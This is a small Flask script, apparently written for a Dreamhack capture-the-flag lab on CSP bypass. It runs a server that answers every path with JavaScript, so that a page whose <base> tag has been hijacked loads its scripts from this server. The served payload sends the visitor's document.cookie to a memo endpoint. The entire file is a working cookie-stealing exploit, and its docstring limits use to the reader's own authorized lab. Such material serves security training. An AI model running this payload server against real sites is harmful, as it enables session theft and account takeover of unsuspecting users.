"""Minimal public-hosting payload server for the Dreamhack CSP Bypass Advanced lab.

Every path returns JavaScript because the vulnerable page's injected <base> tag
redirects its /static/js/*.js requests to this server. Use only for your own
authorized CTF instance.
"""
import os
from flask import Flask, Response

app = Flask(__name__)
PAYLOAD = (
    "location.href = 'http://127.0.0.1:8000/memo?memo=' "
    "+ encodeURIComponent(document.cookie);"
)

@app.route('/', defaults={'path': ''})
@app.route('/<path:path>')
def serve_payload(path):
    return Response(PAYLOAD, content_type='application/javascript; charset=utf-8')

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', '8080')))
